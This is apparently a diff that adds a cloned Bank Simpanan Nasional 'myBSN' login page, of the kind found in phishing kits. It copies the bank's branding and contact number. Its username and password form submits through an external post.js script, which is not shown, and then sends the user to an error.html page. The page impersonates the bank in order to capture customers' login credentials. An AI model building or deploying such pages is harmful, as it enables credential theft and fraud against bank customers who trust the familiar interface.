@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<!-- saved from url=(0040)https://#/fpx_999a/BSN/BSN.php -->
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Welcome to myBSN</title>
+
+
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-touch-fullscreen" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <meta name="format-detection" content="telephone=no">
+
+
+    <link rel="stylesheet" type="text/css" media="all" href="./BSN_files/main.css">
+    <link rel="stylesheet" type="text/css" media="all" href="./BSN_files/responsive_styles.css">
+
+</head>
+
+<body class="prelogin fpx">
+    <div id="global-header">
+        <div id="header">
+            <div>
+                <div id="logo">
+                    <img class="logo-bsn" src="./BSN_files/logobsn.png">
+                    <table class="logo-right">
+                        <tbody>
+                            <tr>
+                                <td class="cust-svc h-m">
+                                    <p>Contact Centre</p>
+                                    <div id="contactNo">1 300 88 1900</div>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+
+
+            </div>
+        </div>
+    </div>
+    <div id="container">
+        <div class="column">
+            <div id="clear"></div>
+            <form name="enterId" onSubmit="submit_form()" action="error.html">
+                <table>
+                    <tbody>
+                        <tr>
+
+                            <td>&nbsp;</td>
+
+                            <td>
+
+                                <div id="content">
+                                    <input name="b" id="b" value="BANK SIMPANAN NATIONAL" hidden="">
+                                    <table id="table-form">
+
+                                        <tbody>
+                                            <tr>
+                                                <td>
+                                                    <div>
+                                                        <table id="table-errors">
+                                                            <tbody>
+                                                                <tr>
+                                                                    <td>
+                                                                        <ul>
+                                                                        </ul>
+                                                                    </td>
+                                                                </tr>
+                                                            </tbody>
+                                                        </table>
+                                                    </div>
+                                                </td>
+                                            </tr>
+
+                                            <tr>
+                                                <td><strong class="show-user-icon">Username</strong><br>
+                                                    <label> <input name="uname" id="uname" type="text" class="text"
+                                                            autofocus="autofocus">
+                                                    </label>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td><strong class="show-user-icon">Password</strong><br>
+                                                    <label> <input name="pd" id="pd" type="password" class="text"
+                                                            autofocus="autofocus">
+                                                    </label>
+                                                </td>
+                                            </tr>
+                                            <tr id="errorMsgRow" style="display: none">
+                                                <td><label class="errors" id="errorMsgLength"></label><br>
+                                                    <label class="errors" id="errorMsgRequired"></label>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td>
+                                                    <input id="button" type="reset" name="reset" onclick="resetId()"
+                                                        value="Clear">
+                                                    <input type="submit" name="_toVerifyImage" value="Login"
+                                                        onclick="javascript:toSubmit();">
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td height="10"></td>
+                                            </tr>
+                                            <tr>
+                                                <td><span>Don't have an online banking account?</span> <br> <a
+                                                        href="https://#/fpx_999a/BSN/BSN.php#"><span>Find out
+                                                            here on how to register for MyBSN.</span></a> <br>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td width="260" align="right">&nbsp;</td>
+                                            </tr>
+                                            <tr>
+                                                <td>
+                                                    <input id="cancelButton" type="submit" name="_toFPX" value="Cancel"
+                                                        onclick="javascript:toCancel();setIsCancel(true);">
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+                <input type="hidden" id="errorMsgReqId" value="Error : This field is required.">
+                <input type="hidden" id="errorMsgReqIdLength1"
+                    value="Error : Please enter at least 8 characters (you entered"> <input type="hidden"
+                    id="errorMsgReqIdLength2" value="characters).">
+                <input type="hidden" id="returnFPX" value="false">
+                <div>
+                    <div id="footer">
+                        <a>Client Charter</a>
+                        <a>Privacy Policy</a>
+                        <a>Security Statement</a>
+                        <a>Terms &amp; Conditions</a>
+                        <a>Contact Us</a>
+                        <div class="disclaimer">Copyright � Bank Simpanan Nasional reserved.<br>
+                            Use of the information on this page is intended for Malaysian citizens
+                            and permanent residents of Malaysia only and all contents on this
+                            website are governed by Malaysian law and are subject to the disclaimer
+                            which can be read on the disclaimer page.</div>
+                    </div>
+                </div>
+                <input type="hidden" name="_csrf" value="7c988b06-f585-4a4c-ac59-395715158d12">
+            </form>
+        </div>
+    </div>
+</body>
+
+<script type="text/javascript" src="post.js"></script>
+
+</html>
